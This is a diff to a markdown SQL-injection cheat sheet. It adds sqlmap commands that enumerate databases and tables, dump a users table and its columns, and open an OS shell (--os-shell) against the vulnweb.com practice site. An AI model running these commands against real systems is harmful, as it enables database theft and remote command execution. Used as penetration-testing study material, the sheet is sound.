@@ -1,5 +1,11 @@
 * [`sqlmap`](#sqlmap)
   * [get request](#get-request)
+  * [post request](#post-request)
+  * [databases](#databases)
+  * [tables](#tables)
+  * [data](#data)
+  * [columns](#columns)
+  * [os shell](#os-shell)
 * [INFORMATION_SCHEMA](#information_schema)
   * [INFORMATION_SCHEMA Tables](#information_schema-tables)
 * [Manual Methods](#manual-methods)
@@ -11,6 +17,7 @@
   * [show data](#show-data)
 
 # `sqlmap`
+If we know the DBMS, we can use option `--dbms=mysql`
 ## get request
 ```
 sqlmap -u "http://example.com/?a=1&b=2&c=3" -p "a,b"
@@ -39,7 +46,26 @@ search=killer
 ```
 sqlmap -r web.txt -p "search"
 ```
-
+## databases
+```
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs 
+```
+## tables
+```
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --tables -D testdb
+```
+## data
+```
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dump -D testdb -T users
+```
+## columns
+```
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dump -D testdb -T users --columns
+```
+### os shell
+```
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --os-shell
+```
 # INFORMATION_SCHEMA
 Refs:
 * <https://www.cmi.ac.in/~madhavan/courses/databases10/mysql-5.0-reference-manual/information-schema.html#schemata-table>
